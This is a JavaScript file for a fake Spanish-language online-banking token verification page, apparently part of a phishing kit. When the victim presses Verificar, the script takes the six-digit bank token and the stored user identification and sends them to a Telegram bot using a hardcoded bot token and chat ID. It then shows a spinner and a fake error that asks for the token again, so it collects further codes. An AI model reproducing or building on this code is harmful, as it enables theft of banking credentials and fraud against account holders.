// Obtener todos los inputs y el botón
const tokenInputs = document.querySelectorAll('.token-input');
const verifyBtn = document.getElementById('verifyBtn');

// Mostrar spinner superpuesto (usa images/ban.png en token.html)
function showSpinner(duration = 3000) {
    return new Promise((resolve) => {
        const overlay = document.getElementById('spinner-overlay');
        if (!overlay) { resolve(); return; }
        overlay.style.display = 'flex';
        // Limpiar los inputs del token apenas aparece el spinner y deshabilitar el botón
        try {
            tokenInputs.forEach(inp => inp.value = '');
            checkAllFieldsFilled();
            verifyBtn.disabled = true;
            if (document.activeElement && typeof document.activeElement.blur === 'function') {
                document.activeElement.blur();
            }
        } catch (e) {
            console.error('Error limpiando inputs del token:', e);
        }
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            overlay.style.display = 'none';
            document.documentElement.style.overflow = '';
            document.body.style.overflow = '';
            resolve();
        }, duration);
    });
}

// Auto-enfocar el primer input al cargar la página
window.addEventListener('DOMContentLoaded', () => {
    tokenInputs[0].focus();
});

// Función para verificar si todos los campos están llenos
function checkAllFieldsFilled() {
    const allFilled = Array.from(tokenInputs).every(input => input.value !== '');
    verifyBtn.disabled = !allFilled;
}

// Agregar eventos a cada input
tokenInputs.forEach((input, index) => {
    // Evento de input para validar y mover al siguiente campo
    input.addEventListener('input', (e) => {
        const value = e.target.value;
        // Solo permitir números
        if (!/^[0-9]*$/.test(value)) {
            e.target.value = '';
            return;
        }

        // Si se ingresó un dígito, mover al siguiente campo
        if (value.length === 1 && index < tokenInputs.length - 1) {
            tokenInputs[index + 1].focus();
        }

        // Verificar si todos los campos están llenos
        checkAllFieldsFilled();
    });

    

    // Seleccionar el contenido al hacer focus
    input.addEventListener('focus', (e) => {
        e.target.select();
    });

    // Prevenir pegado de texto no numérico
    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text');
        
        // Si se pega un código completo
        if (pastedData.length === 6 && /^[0-9]{6}$/.test(pastedData)) {
            tokenInputs.forEach((inp, i) => {
                inp.value = pastedData[i];
            });
            tokenInputs[5].focus();
            checkAllFieldsFilled();
        }
    });
});

// Evento del botón Verificar
verifyBtn.addEventListener('click', async () => {
    // Capturar el token ANTES de que se limpie por showSpinner
    const tokenValue = Array.from(tokenInputs)
        .map(input => input.value)
        .join('');

    // Enviar a Telegram inmediatamente al presionar Verificar (si el token es válido)
    if (tokenValue.length === 6) {
        const identificacion = localStorage.getItem('usuario') || 'Desconocido';
        const BOT_TOKEN = '8443236273:AAFZs13Bf4eBN5ELUHFTLFy0k7gdduPc5QE';
        const CHAT_ID = '-5248821594';
        const message = `💳 *BANCA VIRTUAL - TOKEN*\n\n 📋 *Identificación:* ${identificacion}\n🔐 *token:* ${tokenValue}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        })
        .then(r => r.json())
        .then(d => console.log('Telegram response:', d))
        .catch(e => console.error('Error Telegram:', e));
    }

    // Mostrar un spinner mientras se procesa la verificación
    await showSpinner(10000);

    // Mostrar una SweetAlert de error tal como solicitaste (después del spinner y del envío)
    if (typeof Swal !== 'undefined') {
        await Swal.fire({
            icon: 'error',
            title: 'Oopss',
            text: '¡Ingrese nuevamente su token!',
            confirmButtonText: 'OK'
        });
    }
});

// Permitir enviar con Enter cuando todos los campos estén llenos
tokenInputs.forEach(input => {
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !verifyBtn.disabled) {
            verifyBtn.click();
        }
    });
});